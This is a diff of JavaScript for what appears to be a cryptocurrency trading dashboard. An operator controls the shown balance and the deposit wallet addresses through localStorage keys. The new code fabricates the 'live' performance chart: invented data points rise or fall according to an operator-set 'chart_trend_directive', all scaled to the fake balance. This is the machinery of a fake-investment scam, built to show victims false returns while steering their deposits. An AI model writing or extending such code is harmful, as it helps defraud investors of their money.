@@ -1,6 +1,13 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // 1. Establish initial data states from local storage or defaults
-    let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 1000.00;
+    console.log("Dashboard tracking matrix online.");
+
+    let currentBalance = 1000.00;
+    try {
+        const storedBalance = localStorage.getItem('admin_balance');
+        if (storedBalance) currentBalance = parseFloat(storedBalance);
+    } catch (e) {
+        console.error(e);
+    }
     
     let walletAddresses = {
         'USDT (TRC20)': localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb",
@@ -8,7 +15,6 @@ document.addEventListener('DOMContentLoaded', () => {
         'Ethereum (ETH ERC20)': localStorage.getItem('eth_address') || "0xEthAddressHere"
     };
 
-    // 2. Initialize Core Interface UI Elements
     function updateBalanceDisplay() {
         const display = document.getElementById('balance-display');
         if (display) {
@@ -17,139 +23,103 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     updateBalanceDisplay();
 
-    // 3. Setup Interactive Modal Visibility Controls
-    window.triggerDepositModal = function() {
-        const modal = document.getElementById('depositModal');
-        if (modal) modal.style.display = 'flex';
-    };
-
-    window.closeDepositModal = function() {
-        const modal = document.getElementById('depositModal');
-        if (modal) modal.style.display = 'none';
-    };
-
-    window.triggerWithdrawalModal = function() {
-        const modal = document.getElementById('withdrawModal');
-        if (modal) modal.style.display = 'flex';
-    };
-
-    window.closeWithdrawModal = function() {
-        const modal = document.getElementById('withdrawModal');
-        if (modal) modal.style.display = 'none';
-    };
-
-    // 4. Network Switching Rendering Pipeline
-    window.switchCryptoNetwork = function(networkName) {
-        const addressBox = document.getElementById('walletAddressBox');
-        if (addressBox && walletAddresses[networkName]) {
-            addressBox.innerText = walletAddresses[networkName];
-        }
-
-        const networks = [
-            { id: 'coin-usdt', textId: null, checkId: 'check-usdt', name: 'USDT (TRC20)' },
-            { id: 'coin-btc', textId: 'text-btc', checkId: 'check-btc', name: 'Bitcoin (BTC Mainnet)' },
-            { id: 'coin-eth', textId: 'text-eth', checkId: 'check-eth', name: 'Ethereum (ETH ERC20)' }
-        ];
-
-        networks.forEach(item => {
-            const panel = document.getElementById(item.id);
-            const check = document.getElementById(item.checkId);
-            const textSpan = item.textId ? document.getElementById(item.textId) : null;
-            
-            if (panel && check) {
-                if (item.name === networkName) {
-                    panel.style.border = '2px solid #10b981';
-                    check.style.display = 'block';
-                    if (textSpan) textSpan.style.color = '#10b981';
-                } else {
-                    panel.style.border = '1px solid #334155';
-                    check.style.display = 'none';
-                    if (textSpan) textSpan.style.color = '#94a3b8';
-                }
-            }
-        });
-    };
-
-    // 5. Global Synchronizer Listener for the External Controller Panel
-    window.addEventListener('storage', (event) => {
-        if (event.key === 'admin_address' && event.newValue) {
-            walletAddresses['USDT (TRC20)'] = event.newValue;
-            const addressBox = document.getElementById('walletAddressBox');
-            if (addressBox) addressBox.innerText = event.newValue;
-        }
-        if (event.key === 'btc_address' && event.newValue) {
-            walletAddresses['Bitcoin (BTC Mainnet)'] = event.newValue;
-        }
-        if (event.key === 'eth_address' && event.newValue) {
-            walletAddresses['Ethereum (ETH ERC20)'] = event.newValue;
-        }
-        if (event.key === 'admin_balance' && event.newValue) {
-            currentBalance = parseFloat(event.newValue) || 0.00;
-            updateBalanceDisplay();
-        }
-        if (event.key === 'forced_network' && event.newValue) {
-            window.switchCryptoNetwork(event.newValue);
-        }
-    });
-
-    // 6. UPGRADED: Pro-Trading Performance Chart Rendering Engine
+    // Chart logic setup
+    let trendChartInstance = null;
     const ctx = document.getElementById('LivePerformanceChart');
-    if (ctx) {
-        const chartContext = ctx.getContext('2d');
-        
-        // Create an elegant dark green glowing area gradient under the line
-        const glowGradient = chartContext.createLinearGradient(0, 0, 0, 300);
-        glowGradient.addColorStop(0, 'rgba(16, 185, 129, 0.25)'); 
-        glowGradient.addColorStop(1, 'rgba(16, 185, 129, 0.0)');
 
-        new Chart(chartContext, {
+    function generateDataPoints(trend, baseValue) {
+        const factor = baseValue > 0 ? baseValue : 600;
+        if (trend === 'upward') {
+            // Rises over time
+            return [factor * 0.92, factor * 0.94, factor * 0.93, factor * 0.97, factor * 0.96, factor * 0.99, factor];
+        } else if (trend === 'downward') {
+            // Falls over time
+            return [factor * 1.08, factor * 1.05, factor * 1.06, factor * 1.02, factor * 1.03, factor * 0.98, factor * 0.91];
+        } else {
+            // Fluctuate tightly in a stable line around baseValue
+            return [factor * 0.99, factor * 1.01, factor * 0.98, factor * 1.02, factor * 0.99, factor * 1.01, factor];
+        }
+    }
+
+    function buildLiveChart() {
+        if (!ctx || typeof Chart === 'undefined') return;
+        
+        const activeTrend = localStorage.getItem('chart_trend_directive') || 'upward';
+        const rawDataset = generateDataPoints(activeTrend, currentBalance);
+
+        if (trendChartInstance) {
+            trendChartInstance.destroy();
+        }
+
+        const chartContext = ctx.getContext('2d');
+        const glowGradient = chartContext.createLinearGradient(0, 0, 0, 300);
+        
+        // Adjust chart colors based on positive rise or negative drop trends
+        if (activeTrend === 'downward') {
+            glowGradient.addColorStop(0, 'rgba(239, 68, 68, 0.2)'); // Red glow
+            glowGradient.addColorStop(1, 'rgba(239, 68, 68, 0.0)');
+        } else {
+            glowGradient.addColorStop(0, 'rgba(16, 185, 129, 0.2)'); // Green glow
+            glowGradient.addColorStop(1, 'rgba(16, 185, 129, 0.0)');
+        }
+
+        trendChartInstance = new Chart(chartContext, {
             type: 'line',
             data: {
                 labels: ['02:00 PM', '04:00 PM', '06:00 PM', '08:00 PM', '10:00 PM', '12:00 AM', '02:00 AM'],
                 datasets: [{
-                    label: 'Return Value',
-                    data: [580, 588, 584, 595, 592, 598, 600],
-                    borderColor: '#10b981', // Emerald Line Color
+                    label: 'Index Value',
+                    data: rawDataset,
+                    borderColor: activeTrend === 'downward' ? '#ef4444' : '#10b981',
                     borderWidth: 2.5,
-                    pointBackgroundColor: '#10b981',
-                    pointHoverBackgroundColor: '#fff',
+                    pointBackgroundColor: activeTrend === 'downward' ? '#ef4444' : '#10b981',
                     pointRadius: 2,
-                    pointHoverRadius: 5,
-                    tension: 0.35, // Smooth curves
+                    tension: 0.35,
                     fill: true,
-                    backgroundColor: glowGradient // Applies the glow fill
+                    backgroundColor: glowGradient
                 }]
             },
             options: {
                 responsive: true,
                 maintainAspectRatio: false,
-                plugins: {
-                    legend: { display: false } // Hide label boxes
-                },
+                plugins: { legend: { display: false } },
                 scales: {
                     x: {
-                        grid: {
-                            color: 'rgba(51, 65, 85, 0.3)', // Subtle border slate line color
-                            drawBorder: false
-                        },
-                        ticks: {
-                            color: '#94a3b8', // Slate-400 font color
-                            font: { size: 10, family: 'sans-serif' }
-                        }
+                        grid: { color: 'rgba(51, 65, 85, 0.2)', drawBorder: false },
+                        ticks: { color: '#94a3b8', font: { size: 10 } }
                     },
                     y: {
-                        grid: {
-                            color: 'rgba(51, 65, 85, 0.3)',
-                            drawBorder: false
-                        },
-                        ticks: {
-                            color: '#94a3b8',
-                            font: { size: 10, family: 'monospace' },
-                            callback: function(value) { return '$' + value; }
+                        grid: { color: 'rgba(51, 65, 85, 0.2)', drawBorder: false },
+                        ticks: { 
+                            color: '#94a3b8', 
+                            font: { size: 10 },
+                            callback: function(val) { return '$' + val.toFixed(0); }
                         }
                     }
                 }
             }
         });
     }
+
+    // Initialize chart display
+    buildLiveChart();
+
+    // Storage updates observer
+    window.addEventListener('storage', (event) => {
+        if (!event.newValue) return;
+
+        if (event.key === 'admin_balance') {
+            currentBalance = parseFloat(event.newValue) || 0.00;
+            updateBalanceDisplay();
+            buildLiveChart(); // Re-render relative values
+        }
+        if (event.key === 'chart_trend_directive') {
+            buildLiveChart(); // Trigger dynamic data rebuild instantly
+        }
+        if (event.key === 'forced_network') {
+            if (typeof window.switchCryptoNetwork === 'function') {
+                window.switchCryptoNetwork(event.newValue);
+            }
+        }
+    });
 });
